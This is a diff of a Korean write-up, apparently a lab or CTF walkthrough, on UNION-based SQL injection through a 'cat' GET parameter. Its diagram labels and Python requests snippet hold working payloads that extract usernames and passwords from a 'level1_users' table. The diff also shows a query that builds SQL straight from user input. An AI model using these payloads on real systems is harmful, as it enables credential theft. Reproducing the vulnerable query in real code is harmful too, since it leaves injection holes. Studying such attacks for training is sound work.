@@ -22,37 +22,28 @@
             "server"[shape="plaintext"];
             "server" -> step1 -> step3 -> step5 -> step7 -> step9;
         }
-        step0 -> step1[label="post_data: {cat=1 union select %s from level1_users}",arrowhead="normal"];
+        step0 -> step1[label="cat=1 union select %s from level1_users",arrowhead="normal"];
         step3 -> step2[label="Column Length",arrowhead="normal"];
-        step4 -> step5[label="post_data: {cat=1 union select 1,2,username,password from level1_users}",arrowhead="normal"];
+        step4 -> step5[label="cat=1 union select 1,2,username,password from level1_users",arrowhead="normal"];
         step7 -> step6[label="Data Extract",arrowhead="normal"];
     }
 
 |
 
-취약점 존재 여부 확인
+server -> DB 예측
 ================================================================================================================
 
-- GET 페이지 취약점
-- GET 파라미터: cat
-- MySQL, Union Select Injection
 - 테이블명: level1_users
+- GET 파라미터: cat
 
+.. code-block:: sql
 
-.. code-block:: html
-
-    <br>Category: <a href="?cat=1">1</a>
-    This category does not exist! 
-    <form method="post">
-    Username: <input type="text" name="user">
-    Password: <input type="text" name="password">
-    <input type="submit" name="login" value="Login">
-    </form>
-    
+    SELECT * FROM tb_name where
+    cat=$_GET["cat"]
 
 |
 
-Column Length
+union select
 ================================================================================================================
 
 - 컬럼 개수 확인
@@ -78,7 +69,7 @@ Column Length
 
 |
 
-Data Extract
+union select
 ================================================================================================================
 
 - 데이터 추출
@@ -94,7 +85,6 @@ Data Extract
     params = {
         "cat": "1 union select 1,2,username,password from level1_users"
     }
-
     r = requests.get(url, params=params, verify=False)
     print r.content
 
